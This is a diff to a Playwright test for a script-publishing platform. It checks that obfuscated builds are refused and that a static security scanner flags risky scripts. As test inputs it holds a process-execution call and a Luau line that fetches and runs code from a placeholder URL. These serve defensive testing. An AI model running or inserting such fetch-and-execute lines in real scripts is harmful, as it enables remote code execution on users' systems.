@@ -28,6 +28,16 @@ async function run() {
     await page.locator('#publishScriptBtn').waitFor({state:'visible'});
     await page.waitForFunction(()=>!document.getElementById('publishScriptBtn').disabled);
   }
+  async function submitBuild(status='Completed',button='#publishScriptBtn') {
+    const responsePromise=page.waitForResponse(response=>response.request().method()==='PUT' && /\/api\/(?:platform|catalog)\/projects\//.test(response.url()));
+    await page.locator(button).click();
+    const response=await responsePromise,data=await response.json();
+    assert.ok(response.ok(),JSON.stringify(data));
+    assert.ok(data.jobId,'The server returned the new durable job');
+    // Consecutive refusals must wait for this job, not the previous Failed label.
+    await page.waitForFunction(({id,status})=>document.getElementById('cancelScriptJob').dataset.job===id && document.getElementById('scriptJobStatus').textContent===status,{id:data.jobId,status});
+    await done(status);
+  }
   const work=path.resolve(__dirname,'../work'); await fs.mkdir(work,{recursive:true});
   try {
     await context.addCookies([{name:'ah_session',value:fixture.cookies[0].slice('ah_session='.length),url:fixture.base}]);
@@ -65,7 +75,7 @@ async function run() {
     const source='-- café, private original\r\nlocal greeting = "welcome"\r\nreturn greeting\r\n';
     await page.locator('#scriptFile').setInputFiles({name:'my-release.luau',mimeType:'text/plain',buffer:Buffer.from(source)});
     await page.getByText('Original ready to upload · my-release.luau',{exact:false}).waitFor();
-    await page.locator('#publishScriptBtn').click(); await done();
+    await submitBuild();
     equal(uploads[0].content,source,'The uploaded file keeps its UTF-8 content and CRLF line endings');
     equal(uploads[0].filename,'my-release.luau','Original filename is sent with the source');
     equal(uploads[0].obfuscate,false,'No client transformation or implicit obfuscation occurs');
@@ -85,32 +95,32 @@ async function run() {
 
     await page.locator('#scriptObfuscate').check(); await page.locator('#scriptObfuscationLevel').selectOption('standard');
     await page.locator('#scriptContent').fill('local greeting = "standard private text"\nreturn greeting');
-    await page.locator('#publishScriptBtn').click(); await done();
+    await submitBuild('Failed');
     equal(uploads[1].obfuscate,true,'Standard protection is submitted only after explicit selection');
     equal(uploads[1].obfuscationLevel,'standard','The selected Standard level reaches the backend');
-    await page.waitForFunction(()=>document.getElementById('scriptProtectionBadge').textContent==='Obfuscated (Standard)');
-    equal(await page.locator('#scriptProtectionBadge').textContent(),'Obfuscated (Standard)','Active release shows the actual Standard level');
+    check((await page.locator('#scriptJobError').textContent()).includes('SECURITY_UNVERIFIED'),'Opaque Standard output is refused automatically');
+    equal(await page.locator('#scriptProtectionBadge').textContent(),'Without obfuscation','Refused Standard output does not replace the active release');
     const beforeStrong=(await api('/api/platform/projects/'+project.id)).script.version;
     await page.locator('#scriptObfuscationLevel').selectOption('strong');
     check((await page.locator('#scriptObfuscationHint').textContent()).includes('pairs/ipairs'),'Strong warns about its iterator restriction');
     await page.locator('#scriptContent').fill('for key, value in pairs({answer=42}) do print(key, value) end');
-    await page.locator('#publishScriptBtn').click(); await done('Failed');
+    await submitBuild('Failed');
     check((await page.locator('#scriptJobError').textContent()).includes('SCRIPT_UNSUPPORTED_STRONG'),'Unsupported Strong syntax produces a clear error');
     equal(await page.locator('#scriptContent').inputValue(),'for key, value in pairs({answer=42}) do print(key, value) end','A failed asynchronous build keeps the editable source draft');
     equal((await api('/api/platform/projects/'+project.id)).script.version,beforeStrong,'A failed Strong job keeps the previous active version');
     check(await page.locator('#scriptJobLogs li').count()>0,'Failed jobs expose dated processing logs to the owner');
 
     await page.locator('#scriptContent').fill('local amount = 7\nreturn amount + 2');
-    await page.locator('#publishScriptBtn').click(); await done();
-    await page.waitForFunction(()=>document.getElementById('scriptProtectionBadge').textContent==='Obfuscated (Strong)');
-    equal(await page.locator('#scriptProtectionBadge').textContent(),'Obfuscated (Strong)','A supported Strong build shows the actual level');
+    await submitBuild('Failed');
+    check((await page.locator('#scriptJobError').textContent()).includes('SECURITY_UNVERIFIED'),'Opaque Strong output is refused automatically');
+    equal((await api('/api/platform/projects/'+project.id)).script.version,beforeStrong,'Refused Strong output preserves the active version');
     check((await page.locator('#scriptJobDetail').textContent()).includes('→'),'Build activity includes input/output sizes');
     await page.locator('#editScriptOriginal').click();
     await page.getByText('Private original loaded for editing.',{exact:false}).waitFor();
-    equal(await page.locator('#scriptContent').inputValue(),'local amount = 7\nreturn amount + 2','Editing restores the readable Strong original');
+    equal(await page.locator('#scriptContent').inputValue(),source.replaceAll('\r\n','\n'),'Editing restores the last accepted readable original');
     equal(await page.locator('#scriptObfuscate').isChecked(),false,'Editing explicitly resets optional obfuscation to off');
     await page.locator('#scriptContent').fill('local amount = 8\nreturn amount + 2');
-    await page.locator('#publishScriptBtn').click(); await done();
+    await submitBuild();
     equal(uploads.at(-1).filename,'my-release.luau','Editing and republishing keep the original file metadata');
     equal(uploads.at(-1).obfuscate,false,'Republishing an edited original clears the selected level');
 
@@ -122,13 +132,16 @@ async function run() {
     await page.locator('#listingTitle').fill('My tested release');
     await page.locator('#listingDescription').fill('A test release for the isolated browser fixture.');
     const beforePublication=await api('/api/platform/projects/'+project.id+'/jobs?limit=20');
-    await page.locator('#publishListingBtn').click();
-    await page.locator('#scriptJobStatus').getByText('Completed',{exact:true}).waitFor();
-    await page.locator('#openPublicListing').waitFor({state:'visible'});
+    await submitBuild('Failed','#publishListingBtn');
+    check((await page.locator('#scriptJobError').textContent()).includes('SECURITY_UNVERIFIED'),'Opaque public output cannot enter the catalogue');
     equal(publications.at(-1).obfuscate,true,'The public pipeline receives the explicitly chosen protection');
     equal(publications.at(-1).obfuscationLevel,'standard','Publication uses the same Standard level');
+    await page.locator('#scriptObfuscate').uncheck();
+    await submitBuild('Completed','#publishListingBtn');
+    await page.locator('#openPublicListing').waitFor({state:'visible'});
+    equal(publications.at(-1).obfuscate,false,'A readable publication passes the automatic pipeline');
     const afterPublication=await api('/api/platform/projects/'+project.id+'/jobs?limit=20');
-    equal(afterPublication.jobs.length,beforePublication.jobs.length+1,'One publication creates one durable job');
+    equal(afterPublication.jobs.length,beforePublication.jobs.length+2,'Each publication attempt creates one durable job');
     check(afterPublication.jobs.some(job=>job.kind==='publish' && job.status==='succeeded'),'The catalogue is updated by a successful publication job');
 
     await page.locator('[data-view="script"]').click();
@@ -163,7 +176,7 @@ async function run() {
     const beforeReview=(await api('/api/platform/projects/'+project.id)).script.version;
     await page.locator('#scriptObfuscate').uncheck();
     await page.locator('#scriptContent').fill('os.execute("DO_NOT_EXECUTE_PRIVATE_PAYLOAD")');
-    await page.locator('#publishScriptBtn').click();await done('Failed');
+    await submitBuild('Failed');
     check((await page.locator('#scriptJobSecurity').textContent()).includes('process_execution · line 1'),'Rejected releases show the exact safe rule and line');
     check((await page.locator('#scriptJobSecurity').textContent()).includes('not proof of malicious intent'),'Findings explain the limitations of static triage');
     check(!(await page.locator('#scriptJobSecurity').textContent()).includes('DO_NOT_EXECUTE_PRIVATE_PAYLOAD'),'Finding diagnostics never display source contents');
@@ -173,16 +186,12 @@ async function run() {
     await page.evaluate(()=>document.dispatchEvent(new CustomEvent('audit-hub:language',{detail:{language:'en'}})));
     await page.locator('#scriptObfuscate').uncheck();
     await page.locator('#scriptContent').fill('loadstring(game:HttpGet("https://example.com/script.lua"))()');
-    await page.locator('#publishScriptBtn').click();await done('Awaiting review');
-    check((await page.locator('#scriptJobSecurity').textContent()).includes('dynamic_code'),'Held releases also show the findings requiring review');
-    equal((await api('/api/platform/projects/'+project.id)).script.version,beforeReview,'A held build preserves the active version');
-    const review=(await api('/api/platform/projects/'+project.id+'/jobs?limit=10')).jobs.find(job=>job.status==='review');
-    await fixture.pool.query("INSERT INTO developer_staff_roles(account_id,role) VALUES($1,'ADMIN')",['900000000000000002']);
-    const decision=await require('./src/services/moderation').decide(review.result.submissionId,'approve','900000000000000002','Isolated test of owner refresh after independent review.',{ip:'127.0.0.1'});
-    check(decision.success,'A separate authorized actor approves the held fixture build');
-    await page.locator('#refreshScriptJobs').click();await done();
-    await page.waitForFunction(expected=>document.getElementById('scriptVersion').textContent.includes('v'+expected),beforeReview+1);
-    check((await page.locator('#scriptVersion').textContent()).includes('v'+(beforeReview+1)),'Explicit refresh updates the active version after a held job is approved');
+    await submitBuild('Failed');
+    check((await page.locator('#scriptJobSecurity').textContent()).includes('dynamic_code'),'Automatic refusals show safe diagnostic findings');
+    check((await page.locator('#scriptJobError').textContent()).includes('SECURITY_UNVERIFIED'),'Remote code cannot be approved manually');
+    equal((await api('/api/platform/projects/'+project.id)).script.version,beforeReview,'Automatic refusal preserves the active version');
+    await page.locator('#refreshScriptJobs').click();await done('Failed');
+    check((await page.locator('#scriptVersion').textContent()).includes('v'+beforeReview),'Refresh cannot activate a refused build');
 
     await page.evaluate(()=>{localStorage.setItem('audit-hub-language','fr');document.dispatchEvent(new CustomEvent('audit-hub:language',{detail:{language:'fr'}}));});
     equal(await page.locator('#scriptBuildControls legend').textContent(),'Protection de la version','New protection controls translate to French');
